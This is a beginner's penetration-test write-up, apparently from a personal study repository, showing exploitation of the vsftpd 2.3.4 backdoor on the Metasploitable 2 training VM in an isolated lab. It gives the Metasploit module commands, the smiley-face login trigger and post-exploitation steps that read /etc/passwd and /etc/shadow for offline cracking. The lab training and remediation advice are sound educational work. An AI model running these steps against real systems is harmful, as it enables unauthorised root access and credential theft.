# 🔴 Penetration Test Write-Up: Metasploitable 2 — vsftpd 2.3.4 Backdoor Exploitation

**Author:** Anush  
**Date:** March 9, 2026  
**Difficulty:** Beginner  
**Target:** Metasploitable 2 (Intentionally Vulnerable VM)  
**Attacker Machine:** Kali Linux  
**Lab:** Local VirtualBox Environment  
**Result:** ✅ Root Shell Obtained

---

## ⚠️ Legal Disclaimer

> This attack was performed in a **private, isolated lab environment** using Oracle VirtualBox.  
> Metasploitable 2 is an **intentionally vulnerable virtual machine** built specifically for security training.  
> **Never perform these techniques on any system you do not own or do not have explicit written permission to test.**  
> Unauthorised computer access is illegal in Australia under the Cybercrime Act 2001.

---

## 📋 Table of Contents

1. [Lab Setup](#️-lab-setup)
2. [What is Metasploitable 2](#-what-is-metasploitable-2)
3. [Attack Overview](#️-attack-overview)
4. [Phase 1 — Connectivity Check](#-phase-1--connectivity-check)
5. [Phase 2 — Reconnaissance with Nmap](#-phase-2--reconnaissance-with-nmap)
6. [Phase 3 — Vulnerability Identification](#-phase-3--vulnerability-identification)
7. [Phase 4 — Exploitation with Metasploit](#-phase-4--exploitation-with-metasploit)
8. [Phase 5 — Post Exploitation](#-phase-5--post-exploitation)
9. [What I Learned](#-what-i-learned)
10. [Commands Reference](#-commands-reference)
11. [Real World Relevance](#-real-world-relevance)

---

## 🖥️ Lab Setup

| Component | Details |
|---|---|
| Virtualisation Platform | Oracle VirtualBox |
| Attacker Machine | Kali Linux |
| Target Machine | Metasploitable 2 |
| Network Type | NAT Network (isolated) |
| Attacker IP | 10.0.2.15 |
| Target IP | 10.0.2.5 |

### Why This Setup?

Both machines run inside VirtualBox connected through a virtual private network. No traffic ever leaves the host computer. No real systems are at risk. This is a completely isolated and safe training environment — like a flight simulator for pilots.

---

## 🎯 What is Metasploitable 2?

Metasploitable 2 is a **deliberately vulnerable Linux virtual machine** created by Rapid7 (the company behind Metasploit). Every service running on it has intentional security weaknesses built in — designed specifically for people learning penetration testing.

It runs real vulnerable software versions that existed in the real world, meaning every technique practiced here directly reflects real attack scenarios.

---

## 🗺️ Attack Overview

The entire attack follows 4 stages used in every real penetration test:

```
Stage 1: Reconnaissance  →  What services are running on the target?
Stage 2: Identification  →  Which service has a known vulnerability?
Stage 3: Exploitation    →  Trigger the vulnerability and get access
Stage 4: Post-Exploit    →  Prove access, read sensitive data
```

This methodology mirrors what professional penetration testers do on real client engagements.

---

## 📡 Phase 1 — Connectivity Check

### What and Why

Before attacking anything, confirm the attacker machine can communicate with the target. If they cannot talk to each other, nothing else works. This is like checking you have signal before making a phone call.

### Command

```bash
ping 10.0.2.5 -c 4
```

### Breaking Down the Command

| Part | Meaning |
|---|---|
| `ping` | Send small test packets to check if the target is alive and reachable |
| `10.0.2.5` | The IP address of Metasploitable 2 |
| `-c 4` | Send exactly 4 packets then stop automatically |

### Expected Output

```
PING 10.0.2.5 (10.0.2.5) 56(84) bytes of data.
64 bytes from 10.0.2.5: icmp_seq=1 ttl=64 time=0.4 ms
64 bytes from 10.0.2.5: icmp_seq=2 ttl=64 time=0.3 ms
64 bytes from 10.0.2.5: icmp_seq=3 ttl=64 time=0.4 ms
64 bytes from 10.0.2.5: icmp_seq=4 ttl=64 time=0.3 ms
```

Getting replies back means the machines can communicate successfully.

### 📸 Screenshot

<img width="683" height="230" alt="image" src="https://github.com/user-attachments/assets/1ac2b11c-42c6-4521-baca-9c05d6f82d6b" />


---

## 🔍 Phase 2 — Reconnaissance with Nmap

### What and Why

Nmap (Network Mapper) is a port scanner. Every service on a computer listens on a numbered **port** — think of ports as numbered doors into a building. Nmap knocks on all 65,535 doors and reports back which ones are open, what service is running behind each door, and what **version** that service is running.

The version number is everything. Old software versions have publicly known vulnerabilities listed in databases like CVE. Once we know the version, we can look up exactly how to exploit it.

### Command

```bash
nmap -sV -sC 10.0.2.5
```

### Breaking Down the Command

| Part | Meaning |
|---|---|
| `nmap` | The network scanning tool |
| `-sV` | Detect the VERSION of each running service |
| `-sC` | Run default scripts to gather extra useful information |
| `10.0.2.5` | The target IP address |

### Output

```
PORT     STATE  SERVICE     VERSION
21/tcp   open   ftp         vsftpd 2.3.4
22/tcp   open   ssh         OpenSSH 4.7p1
23/tcp   open   telnet      Linux telnetd
80/tcp   open   http        Apache httpd 2.2.8
139/tcp  open   netbios-ssn Samba smbd 3.X
445/tcp  open   netbios-ssn Samba smbd 3.X
3306/tcp open   mysql       MySQL 5.0.51a
5432/tcp open   postgresql  PostgreSQL 8.3
8180/tcp open   http        Apache Tomcat
```

Every open port is a potential entry point. Each version number can be cross-referenced against vulnerability databases to find known exploits.

### 📸 Screenshot

<img width="1046" height="584" alt="image" src="https://github.com/user-attachments/assets/9e860827-92f3-4878-be7a-00d6ea6b076e" />


---

## 🔎 Phase 3 — Vulnerability Identification

### What We Found

Looking at the nmap results, one line immediately stands out:

```
21/tcp  open  ftp  vsftpd 2.3.4
```

### The vsftpd 2.3.4 Backdoor — The Full Story

In July 2011, an unknown attacker secretly compromised the vsftpd official download server and replaced the legitimate vsftpd 2.3.4 source code with a version containing a **hidden backdoor**. Thousands of servers across the world downloaded and installed this poisoned version without knowing.

**How the backdoor works:**

When someone logs in with a username that contains the characters `:)` — a smiley face — for example `user:)` — the server silently opens **port 6200** and provides a root shell to whoever connects to it. No password needed. Complete system access.

This is a **supply chain attack** — the attacker poisoned the software before it even reached end users. The same concept was used in the SolarWinds hack of 2020, which compromised over 18,000 organisations worldwide including NASA, Microsoft, and the US Treasury Department.

| Detail | Info |
|---|---|
| CVE Reference | CVE-2011-2523 |
| Severity | Critical |
| CVSS Score | 10.0 (Maximum possible) |
| Attack Type | Supply Chain / Remote Backdoor |
| Authentication Required | None |
| Result | Unauthenticated Root Shell |

---

## 💥 Phase 4 — Exploitation with Metasploit

### What is Metasploit?

Metasploit is an open source penetration testing framework maintained by Rapid7. It contains thousands of pre-built exploit modules — one for almost every known vulnerability. Think of it as a toolbox where each tool is a ready-made attack for a specific weakness.

---

### Step 1 — Open Metasploit

```bash
msfconsole
```

**What this does:** Launches the Metasploit Framework. When ready you see the `msf6 >` prompt.

### 📸 Screenshot

<img width="1074" height="822" alt="image" src="https://github.com/user-attachments/assets/8b530341-54d8-4e69-87a1-52f5ada8af00" />


---

### Step 2 — Search for the Exploit

```bash
search vsftpd
```

**What this does:** Searches the entire Metasploit module database for anything related to vsftpd.

**Output:**

```
#  Name                                  Rank       Description
0  exploit/unix/ftp/vsftpd_234_backdoor  excellent  VSFTPD v2.3.4 Backdoor Command Execution
```

The rank **excellent** means Metasploit is highly confident this exploit works reliably every time.

### 📸 Screenshot

<img width="1074" height="822" alt="image" src="https://github.com/user-attachments/assets/6efc9c79-be95-4fb8-b7a7-1621e6f7ec14" />


---

### Step 3 — Select the Exploit

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

**What this does:** Loads the exploit module. Your prompt updates to confirm which module is active:

```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) >
```

---

### Step 4 — Check Required Options

```bash
show options
```

**What this does:** Shows every setting the exploit needs before firing.

**Output:**

```
Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s)
   RPORT   21               yes       The target port (TCP)
```

`RHOSTS` is empty and required — we must fill this with the target IP.  
`RPORT` is already set to 21 (the FTP port) — correct, no change needed.

---

### Step 5 — Set the Target IP

```bash
set RHOSTS 10.0.2.5
```

**Breaking this down:**

| Part | Meaning |
|---|---|
| `set` | Assign a value to a configuration option |
| `RHOSTS` | Remote HOST — the victim machine IP address |
| `10.0.2.5` | The IP address of Metasploitable 2 |

---

### Step 6 — Fire the Exploit

```bash
exploit
```

**What this does:** Executes the full attack against the target.

**Output:**

```
[*] 10.0.2.5:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.0.2.5:21 - USER: 331 Please specify the password.
[+] 10.0.2.5:21 - Backdoor service has been spawned, handling...
[+] 10.0.2.5:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 2 opened (10.0.2.15:34145 -> 10.0.2.5:6200)
```

**Reading each line:**

| Output Line | What It Means |
|---|---|
| `Banner: 220 (vsFTPd 2.3.4)` | Target confirmed running the vulnerable version |
| `Backdoor service has been spawned` | Smiley face trigger worked, port 6200 is now open |
| `UID: uid=0(root) gid=0(root)` | We have ROOT — maximum system privilege |
| `Command shell session 2 opened` | Our keyboard is now directly connected to their terminal |

### 📸 Screenshot

<img width="1074" height="822" alt="image" src="https://github.com/user-attachments/assets/d89672c2-55c8-4e24-b3e0-258ca90ac6ef" />


---

## 🏴 Phase 5 — Post Exploitation

Once inside, the goal is to demonstrate the full impact of the compromise. In a real penetration test, this section proves to the client exactly what a real attacker could access and do.

---

### Confirm Identity and Privilege Level

```bash
whoami
```
**Output:** `root`

```bash
id
```
**Output:** `uid=0(root) gid=0(root) groups=0(root)`

Being root means absolute maximum control. There are zero restrictions on reading, writing, or executing anything on this machine.

### 📸 Screenshot

<img width="1089" height="671" alt="image" src="https://github.com/user-attachments/assets/5b6107a5-b8f2-450a-b35d-a2d818d799d6" />


---

### Read All System User Accounts

```bash
cat /etc/passwd
```

**What this is:** A file listing every user account on the system including usernames, home directories, and shell assignments. In a real attack this gives a complete list of accounts to target or impersonate.

### 📸 Screenshot

> *[INSERT SCREENSHOT — /etc/passwd output]*

---

### Read Hashed Passwords

```bash
cat /etc/shadow
```

**What this is:** The shadow file contains hashed passwords for every user account. Only root can read this file. In a real engagement, these hashes would be taken offline and cracked using Hashcat or John the Ripper to recover plaintext passwords — which are then tried against other systems the target uses (password reuse is extremely common).

### 📸 Screenshot

<img width="1089" height="671" alt="image" src="https://github.com/user-attachments/assets/f605af4d-f2eb-4205-9964-4380ed3e84eb" />


---

### Explore User Home Directories

```bash
ls /home
```

**What this does:** Lists every user personal folder. Each folder may contain sensitive files, documents, SSH private keys, scripts, and saved credentials.

### 📸 Screenshot

<img width="962" height="249" alt="image" src="https://github.com/user-attachments/assets/ff1e88bf-444a-4a82-89ec-5c8513f81922" />


---

### Leave Proof of Exploitation

```bash
echo "Hacked by Anush - Pentest Proof - March 2026" > /tmp/pwned.txt
cat /tmp/pwned.txt
```

**What this does:** Creates a file on the target machine proving access was achieved and maintained. In professional penetration tests, testers always leave a proof file agreed upon with the client beforehand — containing a timestamp and tester identifier — to confirm full system compromise without causing damage.

### 📸 Screenshot

<img width="962" height="249" alt="image" src="https://github.com/user-attachments/assets/63d5ed18-3b50-447f-9194-565011a7e83a" />


---

## 📚 What I Learned

### Technical Skills Demonstrated

| Skill | Tool Used |
|---|---|
| Network port scanning | Nmap |
| Service version fingerprinting | Nmap -sV flag |
| Vulnerability research | CVE databases + Metasploit search |
| Remote code execution | Metasploit Framework |
| Backdoor exploitation | vsftpd 2.3.4 module |
| Post-exploitation enumeration | Linux shell commands |
| Professional documentation | This write-up |

### Concepts Understood

**Ports are doors** — Every networked service listens on a numbered port. Scanning ports reveals the entire attack surface of a target machine.

**Version numbers reveal vulnerabilities** — Software versions map directly to CVEs. Running nmap -sV to fingerprint versions is one of the most valuable steps in any reconnaissance phase.

**Supply chain attacks** — The vsftpd backdoor was injected before the software reached end users. This is one of the most dangerous and hard-to-detect attack vectors in modern cybersecurity.

**The hacking lifecycle** — Reconnaissance, Identification, Exploitation, Post-Exploitation. Every professional pentest follows this exact structure regardless of the target.

**Impact of root access** — Root on a Linux machine means reading password files, creating new users, installing software, accessing all data, and pivoting to other systems on the same network. This is maximum impact.

---

## 📖 Commands Reference

| Command | Purpose |
|---|---|
| `ping <IP> -c 4` | Test network connectivity to target |
| `nmap -sV -sC <IP>` | Scan all ports and detect service versions |
| `msfconsole` | Open the Metasploit Framework |
| `search vsftpd` | Search for relevant exploit module |
| `use exploit/unix/ftp/vsftpd_234_backdoor` | Load the vsftpd exploit module |
| `show options` | Display required configuration settings |
| `set RHOSTS <IP>` | Set the target IP address |
| `exploit` | Execute the attack |
| `whoami` | Confirm current user on compromised machine |
| `id` | Show full user ID and group memberships |
| `cat /etc/passwd` | Read all system user accounts |
| `cat /etc/shadow` | Read hashed passwords (root access required) |
| `ls /home` | List all user home directories |
| `echo "text" > file` | Write proof of exploitation file |

---

## 🌍 Real World Relevance

This exercise demonstrates techniques directly used in professional penetration testing engagements every day.

**What a real pentest report would say about this finding:**

```
Finding:     Critical — Remote Code Execution via vsftpd 2.3.4 Backdoor
CVE:         CVE-2011-2523
CVSS Score:  10.0 (Critical — Maximum)
Impact:      Unauthenticated root access to target server
Proof:       uid=0(root) confirmed via shell session
Remediation: Immediately upgrade vsftpd to current patched version.
             Audit all software versions across infrastructure for known CVEs.
             Implement a vulnerability management program.
```

**Salary range for roles using these skills in Australia:**

| Role | Salary Range (AUD) |
|---|---|
| Junior Penetration Tester | $80,000 — $110,000 |
| Security Analyst | $75,000 — $100,000 |
| Red Team Operator | $120,000 — $160,000 |

---

## 🔗 References

- [CVE-2011-2523 — vsftpd 2.3.4 Backdoor](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523)
- [Metasploit Framework Documentation](https://docs.metasploit.com)
- [Metasploitable 2 — Rapid7](https://docs.rapid7.com/metasploit/metasploitable-2/)
- [OWASP Penetration Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PTES — Penetration Testing Execution Standard](http://www.pentest-standard.org)

---

## 👤 About the Author

This write-up was completed as part of a self-directed ethical hacking and penetration testing study program.

**Currently studying:**
- CompTIA Security+ SY0-701
- OverTheWire Wargames — Bandit (completed levels 0 through 16)
- TryHackMe Pre-Security Path
- Metasploitable 2 lab exercises
- OSINT and Digital Forensics

**Next write-up:** Samba ms08_067 exploitation on Metasploitable 2

---

*This write-up is for educational purposes only. All testing was performed in a completely isolated lab environment. No real systems were involved.*
